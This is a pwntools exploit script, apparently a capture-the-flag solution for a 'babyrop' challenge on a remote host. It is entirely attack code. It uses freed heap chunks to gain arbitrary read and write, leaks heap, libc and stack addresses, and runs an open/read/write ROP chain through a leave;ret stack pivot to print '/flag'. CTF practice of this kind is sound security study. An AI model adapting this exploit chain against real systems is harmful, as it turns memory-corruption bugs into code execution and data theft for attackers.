from pwn import *
context.arch = 'amd64'

elf = ELF('./babyrop')
libc = ELF('./libc.so.6')

p = elf.process(env = {'LD_PRELOAD': './libc.so.6'})
p = remote('mc.ax', 31245)

def create(idx, len, cont):
    p.recvuntil(b'command: ')
    p.send(b'C')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'string: ')
    p.sendline(str(len).encode())
    p.recvuntil(b'string: ')
    p.send(cont)

def free(idx):
    p.recvuntil(b'command: ')
    p.send(b'F')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def read(idx):
    p.recvuntil(b'command: ')
    p.send(b'R')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def write(idx, cont):
    p.recvuntil(b'command: ')
    p.send(b'W')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'string: ')
    p.send(cont)

def exit():
    p.recvuntil(b'command: ')
    p.send(b'E')
    p.recvuntil(b'index: ')
    p.sendline(b'1')

for i in range(5):
    create(i, 0x10, b'aaa')

for i in range(4, -1, -1):
    free(i)

for i in range(5, 10):
    create(i, 0x8, p64(0x30))

read(0)

def parse_hex():
    p.recvuntil(b'hex-encoded bytes\n')
    ls = p.recvline()[:-1].split(b' ')[1:]
    lb = []
    for i in range(len(ls) // 8):
        x = int(ls[i * 8 + 7], 16)
        for o in range(6, -1, -1):
            x <<= 8
            x += int(ls[i * 8 + o], 16)
        lb.append(x)
    return lb
lh = parse_hex()
heap_leak = lh[5] - 0x30
print(hex(heap_leak))

for i in range(2, 10):
    create(i, 0x80, b'qq')

for i in range(3, 10):
    free(i)
free(2)

def ch_ptr(ptr, len):
    write(0, p64(0x100) + p64(0) + p64(0) + p64(0x21) + p64(len)+ p64(ptr))

leak_libc = heap_leak + 0x170
ch_ptr(leak_libc, 0x10)
read(1)
lh = parse_hex()
libc_leak = lh[0]
print(hex(libc_leak))
libc_base = libc_leak - 0x1f4cc0
libc.address = libc_base

environ_off = 0x1fcec0
ch_ptr(libc_base + environ_off, 0x8)
read(1)
lh = parse_hex()
stack_leak = lh[0]
ret_addr = stack_leak - 0x140
print(hex(ret_addr))

buf = 0x404100
buf2 = 0x404300
flag_addr = 0x404500
flag_buf = 0x404600

leave_ret = 0x00000000004012da
pop_rdi = 0x000000000002d7dd + libc_base
pop_rsi = 0x000000000002eef9 + libc_base
pop_rdx = 0x00000000000d9c2d + libc_base
rop = flat([buf2, pop_rdi, flag_addr, pop_rsi, 0, pop_rdx, 0, libc.symbols['open'], pop_rdi, 3, pop_rsi, flag_buf, pop_rdx, 0x100, libc.symbols['read'], pop_rdi, 1, pop_rsi, flag_buf, pop_rdx, 0x100, libc.symbols['write']])

ch_ptr(flag_addr, 0x8)
write(1, b'/flag')
ch_ptr(buf, len(rop))
write(1, rop)
ch_ptr(ret_addr - 0x8, 0x10)
write(1, p64(buf) + p64(leave_ret))

exit()

p.interactive()

# main_arena = __malloc_hook - 0x7500